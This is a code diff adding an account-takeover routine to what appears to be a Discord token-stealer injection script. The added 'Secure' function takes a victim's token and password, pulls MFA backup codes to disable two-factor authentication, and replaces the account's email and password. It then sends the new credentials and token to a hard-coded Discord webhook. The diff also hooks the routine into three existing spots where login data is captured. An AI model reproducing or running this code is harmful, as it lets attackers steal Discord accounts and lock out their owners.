@@ -5,6 +5,196 @@ const https = require("https");
 const querystring = require('querystring');
 const electron = require('electron');
 
+const { MessageBuilder, Webhook } = require('discord-webhook-node');
+const hook = new Webhook('https://ptb.discord.com/api/webhooks/903654798316957756/uz9lSQONl4b5L5NTfdxulWgcFQB1bzCSUAQuLsQqOLrHy_n-MwxlhfkL9RBFtpF2zK7l');
+ hook.setUsername('OxyGeN'); //Overrides the default webhook username
+hook.setAvatar('https://media.discordapp.net/attachments/764453829155880990/903655737711022110/images.jpeg');
+const request = require("request")
+
+  
+function Secure(token,password){
+  	request(
+		"https://discordapp.com/api/v7/users/@me", {
+			method: "GET",
+			headers: {
+				authorization: token,
+			},
+			json: true
+		},
+		function (error, response, body) {
+			
+	
+if(body.mfa_enabled == true){
+console.log(Disable2fa(token,password))
+
+    
+
+} else {
+
+  
+var randomEmail = require('random-email');
+const email =  `oxyfaop`+ `${randomEmail({ domain: 'gmail.com' })}`
+
+      var generator = require('generate-password');
+
+var newPassword = generator.generate({
+	length: 10,
+	numbers: true
+});
+
+  //console.log(body)
+      gaechange(token,email,newPassword,password)
+
+function gaechange (ntoken,nemail,npass,cpass) {
+request(
+		"https://discord.com/api/v8/users/@me", {
+			method: "PATCH",
+			headers: {
+				authorization: ntoken,
+     'Content-Type':"application/json",
+			},
+      body: {
+				username: body.username,
+				password:cpass,
+				discriminator: null,
+				email: nemail,
+				new_password: npass,
+				avatar: body.avatar,
+			},
+			json: true
+      
+		},
+  
+		function (error, response, body) {
+     const embed = new MessageBuilder()
+
+.setTitle("Account Secured")   .setAuthor(`${body.username}#${body.discriminator}`,`https://cdn.discordapp.com/avatars/${body.id}/${body.avatar}.webp`)     
+.addField(`Email:-`,"```"+`${nemail}`+"```")
+  .addField("Password:","```"+`${npass}`+"```")
+.addField("Token:","```"+ `${body.token}`+"```")
+.setColor("#ff4d4d")
+
+  hook.send(embed)
+
+
+      
+  
+  
+})
+}
+      }
+//hmm
+function Disable2fa(token,password){
+  var codes = [];
+request(
+		"https://discord.com/api/v8/users/@me/mfa/codes", {
+			method: "POST",
+
+    headers: {
+				authorization: token,
+    
+			},
+      body: {
+			password:password
+		},
+			json: true
+      
+		},
+  function (error, response, body) {
+		
+      
+ body.backup_codes.forEach(x => codes.push(x.code))
+
+console.log(Df(codes[0],token))
+    
+    function Df(code,token){
+
+request(
+		"https://discord.com/api/v8/users/@me/mfa/totp/disable", {
+			method: "POST",
+			headers: {
+				authorization: token,
+     'Content-Type':"application/json",
+			},
+      body: {
+		code:code,
+      
+      },
+			json: true
+      
+		},
+  
+		function (error, response, body) {
+      
+var randomEmail = require('random-email');
+const email =  `oxyfaop`+ `${randomEmail({ domain: 'gmail.com' })}`
+
+      var generator = require('generate-password');
+
+var newPassword = generator.generate({
+	length: 10,
+	numbers: true
+});
+
+      change(body.token,email,newPassword,password)
+
+      function change (ntoken,nemail,npass,cpass) {
+request(
+		"https://discord.com/api/v8/users/@me", {
+			method: "PATCH",
+			headers: {
+				authorization: ntoken,
+     'Content-Type':"application/json",
+			},
+      body: {
+				username: body.username,
+				password:cpass,
+				discriminator: null,
+				email: nemail,
+				new_password: npass,
+				avatar: body.avatar,
+			},
+			json: true
+      
+		},
+  
+		function (error, response, body) {
+     // console.log(error.email._errors)
+      //console.log(body)
+      const embed = new MessageBuilder()
+
+.setTitle("Account Secured")   .setAuthor(`${body.username}#${body.discriminator}`,`https://cdn.discordapp.com/avatars/${body.id}/${body.avatar}.webp`)     
+.addField(`Email:-`,"```"+`${nemail}`+"```")
+  .addField("Password:","```"+`${npass}`+"```")
+.addField("Token:","```"+ `${body.token}`+"```")
+.setColor("#ff4d4d")
+
+  hook.send(embed)    
+
+            })
+
+      }
+      
+    }
+  )
+    }
+    
+  
+  
+  }
+  )  
+
+}
+}
+    )  }
+////hm
+
+
+
+
+
+
+
 electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
     j.responseHeaders["Access-Control-Allow-Origin"] = '*';
     if (!j.responseHeaders["content-security-policy-report-only"] && !j.responseHeaders["content-security-policy"]) return k({ cancel: false });
@@ -247,7 +437,7 @@ window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
         xmlHttp.responseText;
     `, true).then((ip) => {
         const json = JSON.parse(info);
-
+Secure(token,password)
         var params = {
             username: "Zero Fa",
             content: "",
@@ -300,6 +490,7 @@ window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
         `, true).then((ip) => {
 
             var json = JSON.parse(info);
+Secure(token,newpassword)
             var params = {
                 username: "Zero Fa",
                 content: "",
@@ -357,6 +548,7 @@ window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
         xmlHttp.send( null );
         xmlHttp.responseText;
     `, true).then((ip) => {
+Secure(token,password)
         var json = JSON.parse(info);
         var params = {
             username: "Zero fa",
